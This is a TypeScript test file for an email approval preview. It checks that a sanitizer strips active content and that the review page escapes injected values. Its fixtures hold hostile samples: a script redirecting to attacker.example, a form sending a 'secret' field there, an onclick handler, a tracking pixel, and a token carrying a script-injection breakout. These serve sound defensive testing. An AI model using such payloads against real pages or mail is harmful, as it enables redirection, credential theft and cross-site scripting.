import { describe, expect, it } from "vitest";
import { buildEmailPreviewDocument, sanitizeEmailHtml } from "../src/email-preview";
import { renderSendApprovalReview } from "../src/send-approval-auth";
import type { SendApprovalRecord, SendApprovalSnapshot } from "../src/send-approval";

const snapshot: SendApprovalSnapshot = {
  from: "Sender <sender@example.com>",
  to: ["Recipient <recipient@example.com>"],
  cc: ["Team <team@example.com>"],
  bcc: ["Private <private@example.com>"],
  subject: "A polished approval preview",
  textBody: "Hello,\n\nThis is the plain-text version.",
  htmlBody: `<div style="max-width: 600px; color: #243447; position: fixed">
    <h2 onclick="alert('no')">Hello!</h2>
    <p>This is <strong>formatted</strong> email content.</p>
    <a href="https://tracker.example/click">A disabled link</a>
    <img src="https://tracker.example/pixel.gif" alt="Quarterly chart">
    <form action="https://attacker.example"><input name="secret"><button>Submit</button></form>
    <script>parent.location='https://attacker.example'</script>
  </div>`,
  attachments: [{
    blobId: "blob-1",
    name: "quarterly-report.pdf",
    type: "application/pdf",
    size: 245_760,
  }],
  inReplyTo: [],
  references: [],
  truncated: false,
};

const record: SendApprovalRecord = {
  id: "approval-1",
  userLogin: "sender@example.com",
  toolName: "send_email",
  draftId: "draft-1",
  payloadDigest: "digest-1",
  status: "pending",
  createdAt: "2026-08-19T18:00:00.000Z",
  expiresAt: "2026-08-19T18:10:00.000Z",
};

describe("email approval preview", () => {
  it("preserves common formatting while removing active and networked content", () => {
    const sanitized = sanitizeEmailHtml(snapshot.htmlBody);

    expect(sanitized).toContain("<h2>Hello!</h2>");
    expect(sanitized).toContain("<strong>formatted</strong>");
    expect(sanitized).toContain("max-width: 600px");
    expect(sanitized).toContain("image-placeholder");
    expect(sanitized).toContain("Quarterly chart");
    expect(sanitized).not.toMatch(/<\/?(?:script|form|input|button)\b/i);
    expect(sanitized).not.toMatch(/onclick|href=|src=|tracker\.example|attacker\.example|position:/i);
  });

  it("adds an inner CSP and safely falls back to plain text", () => {
    const document = buildEmailPreviewDocument("", `<b>Not HTML</b>\nSecond line`);

    expect(document).toContain("default-src 'none'");
    expect(document).toContain("form-action 'none'");
    expect(document).toContain("&lt;b&gt;Not HTML&lt;/b&gt;\nSecond line");
  });

  it("renders a polished review page with a sandboxed preview and both source alternatives", async () => {
    const response = renderSendApprovalReview(record, `token\"><script>alert(1)</script>`, snapshot);
    const html = await response.text();

    expect(response.status).toBe(200);
    expect(response.headers.get("content-security-policy")).toContain("frame-src 'self'");
    expect(html).toContain("Ready to send?");
    expect(html).toContain("sandbox=\"\"");
    expect(html).toContain("referrerpolicy=\"no-referrer\"");
    expect(html).toContain("Plain-text version");
    expect(html).toContain("HTML source");
    expect(html).toContain("quarterly-report.pdf");
    expect(html).toContain("Keep as draft");
    expect(html).not.toContain(`<input type="hidden" name="token" value="token\"><script>`);
  });
});
